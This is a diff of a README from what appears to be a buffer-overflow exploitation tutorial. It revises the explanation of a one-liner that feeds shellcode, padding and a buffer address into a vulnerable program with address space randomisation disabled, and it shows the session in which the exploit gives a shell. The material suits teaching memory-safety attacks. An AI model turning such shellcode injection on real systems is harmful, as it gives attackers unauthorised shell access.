@@ -107,10 +107,9 @@ We are ready to hack! The following magic all-in-one shell command pipes the req
 
 - `( cat shellcode ; printf %080d 0 ; echo $a )` -- appends the content of `shellcode` file, eighty zeros, and address of buffer (from the variable `a`) together.
 - `xxd -r -p` -- converts hexdump string to binary.
-Here is what our shell dialog looks like.
-- setarch `arch` -R -- disables randomization of address space.
+- `setarch -R` -- disables randomization of address space.
 
-woop woop is the magic key to open the secret shell (just kidding any input will do)!
+`woop woop` is the magic key to open the secret shell (just kidding any input will do)!
 ```
 0x7fffffffe3d0
 What's your name?
@@ -118,6 +117,8 @@ woop woop
 Hello, ?_H1??;H1?H1??????/bin/sh!
 ls    
 README.md  a.out  problem1  problem1-ubuntu64.c  problem2.c  shellcode	shellcode.c  victim
+uname -a
+Linux xenon 5.4.0-72-generic #80-Ubuntu SMP Mon Apr 12 17:35:00 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 ```
 
 
